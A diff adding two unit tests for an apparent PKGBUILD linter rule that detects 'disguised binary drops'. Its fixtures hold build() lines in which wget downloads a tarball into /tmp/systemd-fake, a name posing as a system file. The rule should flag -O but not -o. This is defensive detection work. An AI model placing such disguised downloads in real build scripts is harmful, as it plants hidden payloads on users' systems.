@@ -147,3 +147,29 @@ def test_per006_fires_on_bundled_curl_flags(make_pkgbuild_ctx):
         """
     )
     assert len(list(PER006DisguisedBinaryDrop().check(ctx))) == 1
+
+
+def test_per006_does_not_fire_on_wget_log_file_flag(make_pkgbuild_ctx):
+    # wget's -o is its own LOG file, not a content-download target -- unlike
+    # curl, where -o *is* the content target. Redirecting wget's log chatter to
+    # a /tmp/systemd-* path isn't dropping a disguised binary there.
+    ctx = make_pkgbuild_ctx(
+        """
+        build() {
+          wget -o /tmp/systemd-fake https://example.com/legit-tool.tar.gz
+        }
+        """
+    )
+    assert list(PER006DisguisedBinaryDrop().check(ctx)) == []
+
+
+def test_per006_fires_on_wget_output_document_flag(make_pkgbuild_ctx):
+    # wget's -O (uppercase) IS the content-download target.
+    ctx = make_pkgbuild_ctx(
+        """
+        build() {
+          wget -O /tmp/systemd-fake https://example.com/legit-tool.tar.gz
+        }
+        """
+    )
+    assert len(list(PER006DisguisedBinaryDrop().check(ctx))) == 1
